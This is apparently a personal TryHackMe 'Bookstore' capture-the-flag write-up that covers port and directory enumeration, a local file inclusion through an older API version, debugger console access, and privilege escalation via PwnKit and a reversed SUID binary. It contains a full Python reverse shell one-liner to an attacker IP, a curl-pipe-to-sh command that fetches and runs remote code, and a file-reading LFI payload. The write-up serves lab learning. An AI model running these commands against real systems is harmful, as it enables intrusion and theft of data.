## TryHackMe - Bookstore
> Completed 7th June 2022.

This ended up being a challenging box to throw myself against particularly because I was lacking some medium level practice. However, it ended up being privilege escalation that proved to be the most challenging aspect and not the web-app hacking. Upon completion of the box and checking my method against other write ups I could tell I had not gone down the conventional route and I make note of this deviation below.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nmap
- ffuf
- Metasploit
- simpleHTTPserver
- Linpeas.sh ([source](https://github.com/carlospolop/PEASS-ng))

---
### Methodology
#### Objectives/Flags
1. user.txt
2. root.txt

---
#### Reconnaissance
First I started off by running an nmap scan against the target
```bash
nmap -t4 <TargetIP>
```
```
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
5000/tcp  open     upnp
13705/tcp filtered netbackup
48479/tcp filtered unknown
49432/tcp filtered unknown
```
Using this output we can see that the host is running a web server accross port `80` and an unknown service of interest over port `5000`.

Navigating to the IP/url of the site we can see the Bookstore site which appears to be a digital store front that's still in development.

First things first I start to spider the site using ffuf. In the past I had used Gobuster which I felt had a better user experience however it was worth trying a new tool out. The wordlist used was `httparchive_directories_1m_2021_04_28.txt` which can be found here: https://wordlists.assetnote.io/
```bash
ffuf -w /<wordlist>.txt -u http://<TargetIP>/FUZZ > /<output>.txt
```
```
http://<TargetIP>/index.html
http://<TargetIP>/login.html
http://<TargetIP>/images/
http://<TargetIP>/icons
http://<TargetIP>/javascript/
http://<TargetIP>/javascript/jquery
http://<TargetIP>/assets/
http://<TargetIP>/assets/css/
http://<TargetIP>/assets/fonts/
http://<TargetIP>/assets/js/
```
From this list I started poking around file paths and through the source to find anything of interest.
```
http://<TargetIP>/login.html
  <!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid's bash history file -->

http://10.10.44.68/assets/js/api.js
  //the previous version of the api had a parameter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
```
From this information I could surmise that the site had a vulnerability in it's API and I would be able to find a pin/password in the user `sid`'s bash history.

Now it was time to try and find the API vector for further enumeration. I spent a good amount of time walking over the site to finding this but I wasn't successful until I tried to visit the using the open port `5000` that was discovered earlier through nmap.
```
http://<TargetIP>:5000
```
Here I discovered the REST API and it's version and decided to run another fuzz against this new vector.
```bash
ffuf -w /<wordlist>.txt -u http://<TargetIP>:5000/FUZZ > /<output>.txt
```
```
http://<TargetIP>:5000/
http://<TargetIP>:5000/console
http://<TargetIP>:5000/api
```
The results revealed the entry point for the console under `/console` and documentation under `/api`. Using one of the API calls found in the documentation I could see that calls can be made through the URL.
```
http://<TargetIP>:5000/api/v2/resources/books/all
```
Immediately I could see a reference to the API's version through the URL with `/v2/`  and swapped it back down to `/v1/` as per the hint we found through enumeration.
```
http://<TargetIP>:5000/api/v1/resources/books/all
```
This revealed data similar however was in a more rudimentary format confirming that the potentially vulnerable version was still in use. From here I could start to employ some LFI using SSRF. I spent a bit of time going over my notes to make this work, eventually finding the `?show=` function to make the requests. Upon finding the viable method, I aimed straight for user `Sid`'s bash history'.
```
http://<TargetIP>:5000/api/v1/resources/books?show=/home/sid/.bash_history
```
With a successful call the pin is revealed which I could then use to unlock the console. At this point I needed to get an output from the console to understand what it does so I started by entering some linux commands.

The output indicated that my inputs were expected to by python commands so I started to see if I could start trying to gain a foothold into the machine by setting up a reverse shell through the console's python.

#### Weaponization 
As I was going in not knowing what to expect I decided to use metaspoit for it's versatility. For the sake of learning I should try to avoid using it in future when possible. 

Once booter I set up a standard listener.
```bash
sudo msfdb init && msfconsole
use exploit/multi/handler
set lhost <AttackerIP>
set lport <AttackerListeningPort>
run
```

#### Delivery
N/A

#### Exploitation
As the console's input was feeding into python I found a reverse shell command that is interpretable by the language and fed that in to the input.
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<AttackerIPAddress>",<ListeningPort>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```
After a moment my listener lit up and gave me an input. I had made it onto the host.
```bash
whoami
  sid
```

#### Installation 
N/A

#### Command & Control
N/A

#### Actions on Objective
As I had established a connection into user `sid`'s home directory I immediately found the first flag `user.txt`.
```bash
sid@bookstore:~$ ls -l
ls -l
total 44
-r--r--r-- 1 sid  sid  4635 Oct 20  2020 api.py
-r-xr-xr-x 1 sid  sid   160 Oct 14  2020 api-up.sh
-rw-rw-r-- 1 sid  sid 16384 Oct 19  2020 books.db
-rwsrwsr-x 1 root sid  8488 Oct 20  2020 try-harder
-r--r----- 1 sid  sid    33 Oct 15  2020 user.txt
```
```
cat user.txt
  {FLAG}
```

>Edit: I couldn't use `nano` correctly and would receive an error `Error opening terminal: unknown`. After some research I found that I could modify the terminal emulator to mimic a linux terminal. More information can be found [here](https://bash.cyberciti.biz/guide/$TERM_variable).
```
import TERM=linux
```

From this point I spent a lot of time trying to poke around and see what permissions the user did and didn't have. My initial thoughts had been `try-harder` was a file of interest as it was out of place but prior to modifying the terminal emulator it wasn't running correctly and I was search around for potential vectors using checklists I had found online. They can be found [here](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)and [here](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist). Additionally I had run a file scan similar to what was done in my attempt at [Vulnversity](https://github.com/dozmert/Security-Labs/blob/main/TryHackMe/Vunversity/readme.md).
```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
  -rwsr-xr-x 1 root root 59640 Mar 23  2019 /usr/bin/passwd
  -rwsr-xr-x 1 root root 44528 Mar 23  2019 /usr/bin/chsh
  -rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
  -rwsr-xr-x 1 root root 37136 Mar 23  2019 /usr/bin/newgidmap
  -rwsr-xr-x 1 root root 18448 Jun 28  2019 
  /usr/bin/traceroute6.iputils
  -rwsr-xr-x 1 root root 76496 Mar 23  2019 /usr/bin/chfn
  -rwsr-xr-x 1 root root 75824 Mar 23  2019 /usr/bin/gpasswd
  -rwsr-xr-x 1 root root 37136 Mar 23  2019 /usr/bin/newuidmap
  -rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
  -rwsr-xr-x 1 root root 40344 Mar 23  2019 /usr/bin/newgrp
  -rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
  -rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
  -rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
  -rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine
  -rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
  -rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

After spending a few days going over possible entry points I was pointed towards [PEASS](https://github.com/carlospolop/PEASS-ng. A project which appears to automate privilege escalation vulnerability search. I started by downloading onto my machine and hosted it on my SimpleHTTPServer.
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220605/linpeas_linux_amd64
python3 -m http.server <ListeningPort> --directory <UploadDirectory>
```
While I could `wget` this file onto the server host I found a neat command which would run the file bash file remotely.
```bash
curl remotely
  curl <AttackerIPAddress>/linpeas.sh | sh
```
```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034 

╔══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                                 
You can write SUID file: /home/sid/try-harder
-rwsr-xr-x 1 root root 59K Mar 23  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                  
-rwsr-xr-x 1 root root 44K Mar 23  2019 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 75K Mar 23  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)                                                                                                                
-rwsr-xr-x 1 root root 40K Mar 23  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 111K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)                                                                                      

╔══════════╣ SGID
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
```

From the output we can see that the host is vulnerable to `CVE-2021-4034` `PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec`.
Now I  began upgrading my session to meterpreter to run the metaspoit module. We can see in the search results it's rated as `excellent` which means it's going to be quite reliable without a huge footprint. Ranking information can be found [here](https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html).
```bash
CTRL+Z to background session
search 4034
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
show options
set SESSION <ID>
set LHOST <AttackerIPAddress>
set LPORT <AttackerListeningPort>
run
sessions <NewID>
```
Once we're in the new session we are a bit limited as to what commands we can run. I started experimenting and found `cat` to still function. I guessed for the location of the flag.
```bash
cat /root/root.txt
  {FLAG}
```
 We have successfully found all the flags and could now terminate the session.

>Edit: Upon completion of the box and this writeup I have compared my work against other publicly available writeups. I had found several people reverse engineering the file try-harder to find a number that will allow them to gain root. Once finding this, I decided it was a good idea to go back and find out how this can be done.

I was pointed towards a tool on the system called `ghidra`. Once I created a temporary project and imported the binary file using the `CodeBrowser` module. In here I started searching through the functions and found an interesting entry under the `main`.
```
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
```
 local_18 = 0x5db3;
 local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
```
From  the excerpt of interest we can see the variable `local_14` is the key to passing successful. `local_1c`, `0x1116` and `local_18` will need to be identified.
local_18 can be seen as `0x5db3`
local_1c can also be seen as `0x5db3`
Now I didn't understand this part too well, but this is known as a XOR function and we can reverse it by substituting the values and throwing it into an interpreter.
```bash
python3                          
Python 3.9.12 (main, Mar 24 2022, 13:02:21) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x5dcd21f4^0x1116^0x5db3
1573743953
```
We now punch this number into the try-harder binary.
```bash
chmod +x ./try-harder
./try-harder
1573743953
```
And we can check our id to see we are now a root user.
```bash
id
uid=0(root) gid=1000(sid) groups=1000(sid)
```

---
### After-action
#### What I've learned
This box taught me a lot across the board. Firstly, I got to try newly learned enumeration strategies. I got to read up and explore a number of local file inclusion payloads through server-side request forgery using the api. Lastly I found a large knowledge gap in privilege escalation the more I explored checklists and probing strategies.

> Edit: Coming back to reverse engineer the binary file was a new experience for me. I figured the file was of interest but didn't know how this could be done. Coming back again to do it gave me a new vector angle to try in future.

#### What I would've done differently
I would have liked to have found the pwnkit vulnerability without the use of an automated tool such as Linpeas. I would also have liked to have spent more time recording my different attempts at privilege escalation for posterity.

> Edit: I would also like to understand more about reverse engineering binary files and how XOR functions work.